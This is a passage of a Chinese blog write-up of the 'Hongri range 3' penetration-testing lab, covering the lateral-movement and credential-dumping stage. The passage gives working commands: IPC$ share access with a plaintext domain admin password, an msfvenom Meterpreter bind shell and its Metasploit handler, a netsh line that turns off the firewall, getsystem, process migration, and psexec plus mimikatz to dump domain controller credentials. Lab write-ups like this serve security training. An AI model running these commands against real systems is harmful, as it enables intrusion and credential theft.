+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.93.20\ipc$ &quot;zxcASDqw123!!&quot; /user:TEST.ORG\Administrator</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/1659280381_62e69bfdf2b12db03b8d5.png!small" alt="img"></p>
+<p>成功建立ipc共享</p>
+<p>生成一个msf bind马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/bind_tcp LHOST=192.168.48.136 LPORT=6666 -f exe &gt; shell2.exe</span><br></pre></td></tr></table></figure>
+
+<p>将马通过远程桌面上传到2008主机上</p>
+<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/1659280401_62e69c112257296a931a1.png!small" alt="img"></p>
+<p>再通过ipc文件共享复制到2012主机上</p>
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/1659280415_62e69c1f920c7e3f04b5c.png!small" alt="img" style="zoom:90%;" />
+
+<p>上传成功，在msf开启监听</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/bind_tcp</span><br><span class="line">set RHOST 192.168.93.10</span><br><span class="line">set LPORT 6666</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p>在CMD上执行马，发现没有收到会话，应该是被防火墙拦截了，关闭防火墙</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NetSh Advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure>
+
+<p>成功收到会话</p>
+<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/1659280438_62e69c364f02b9faa6646.png!small" alt="img"></p>
+<p>使用getsystem命令提权</p>
+<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/1659280452_62e69c4476508ae5e2ab9.png!small" alt="img"></p>
+<p>进程迁移</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">migrate PID</span><br></pre></td></tr></table></figure>
+
+<p>成功拿下所有主机</p>
+<img src="https://image.3001.net/images/20220731/1659280482_62e69c62094407850cb11.png!small" alt="img" style="zoom:150%;" />
+
+<p>最终在C:\Users\Adminisreator\Documents\目录下找到flag.txt</p>
+<h6 id="mimikatz抓域控密码"><a href="#mimikatz抓域控密码" class="headerlink" title="mimikatz抓域控密码"></a>mimikatz抓域控密码</h6><p>要是没有爆出10这台主机密码，也可以使用mimikatz抓取hash并保存为日志</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">psexec64.exe \\192.168.93.20 cmd</span><br><span class="line">mimiKatz.exe log privilege::debug sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+
+<p>type mimikatz.log读取日志内容可以发现域控的帐号密码为Administrator  zxcASDqw123!!</p>
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230425195531063.png" alt="image-20230425195531063" style="zoom:44%;" />
+
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230425195500390.png" alt="image-20230425195500390" style="zoom: 45%;" />
+
+<p>即可进行后续操作</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://micgo.top">micgo</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://micgo.top/%E6%B8%97%E9%80%8F/%E7%BA%A2%E6%97%A5%E4%B8%89/">https://micgo.top/%E6%B8%97%E9%80%8F/%E7%BA%A2%E6%97%A5%E4%B8%89/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用<meta name="referrer" content="no-referrer"> <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://micgo.top" target="_blank">micgo's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%BA%A2%E6%97%A5/">红日</a></div><div class="post_share"><div class="social-share" data-image="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20201009112151822.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/%E6%B8%97%E9%80%8F/%E7%BA%A2%E6%97%A5%E4%BA%8C/"><img class="next-cover" src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20201009112151822.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">红日靶场二</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20230225215514.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">micgo</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">33</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">21</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/micgo520"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text">服务器渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%9E%E6%8E%A5mysql"><span class="toc-number">2.1.</span> <span class="toc-text">连接mysql</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0getshell"><span class="toc-number">2.2.</span> <span class="toc-text">后台getshell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%95%E8%BF%87disable-functions"><span class="toc-number">2.3.</span> <span class="toc-text">绕过disable_functions</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">3.</span> <span class="toc-text">内网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83"><span class="toc-number">3.1.</span> <span class="toc-text">脏牛提权</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#msf"><span class="toc-number">3.2.</span> <span class="toc-text">msf</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%B0%9D%E8%AF%95"><span class="toc-number">3.3.</span> <span class="toc-text">永恒之蓝尝试</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E6%9E%9A%E4%B8%BE"><span class="toc-number">3.4.</span> <span class="toc-text">密码枚举</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">3.5.</span> <span class="toc-text">横向移动</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#psexec"><span class="toc-number">3.5.1.</span> <span class="toc-text">psexec</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#wmiexec"><span class="toc-number">3.5.2.</span> <span class="toc-text">wmiexec</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#mimikatz%E6%8A%93%E5%9F%9F%E6%8E%A7%E5%AF%86%E7%A0%81"><span class="toc-number">3.5.3.</span> <span class="toc-text">mimikatz抓域控密码</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E6%B8%97%E9%80%8F/%E7%BA%A2%E6%97%A5%E4%B8%89/" title="红日靶场三">红日靶场三</a><time datetime="2023-04-24T16:00:00.000Z" title="发表于 2023-04-25 00:00:00">2023-04-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E6%B8%97%E9%80%8F/%E7%BA%A2%E6%97%A5%E4%BA%8C/" title="红日靶场二">红日靶场二</a><time datetime="2023-04-22T16:00:00.000Z" title="发表于 2023-04-23 00:00:00">2023-04-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E6%B8%97%E9%80%8F/ctfshow%E2%80%94realworld%E6%B8%97%E9%80%8F%E8%B5%9B/" title="ctfshow——RealWorld渗透赛">ctfshow——RealWorld渗透赛</a><time datetime="2023-04-17T16:00:00.000Z" title="发表于 2023-04-18 00:00:00">2023-04-18</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E6%B8%97%E9%80%8F/%E7%BA%A2%E6%97%A5%E4%B8%80/" title="红日靶场一">红日靶场一</a><time datetime="2023-04-14T16:00:00.000Z" title="发表于 2023-04-15 00:00:00">2023-04-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E6%B8%97%E9%80%8F/ctfshow%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/" title="ctfshow终极考核">ctfshow终极考核</a><time datetime="2023-04-12T16:00:00.000Z" title="发表于 2023-04-13 00:00:00">2023-04-13</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20201009112151822.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By micgo</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: '2t5fYJ95Y61Dyi4xHc3dWgxl-gzGzoHsz',
+      appKey: 'UNfGz5zfJGeNX6LS5OyiymLm',
+      avatar: 'monsterid',
+      serverURLs: 'https://2t5fyj95.lc-cn-n1-shared.com',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
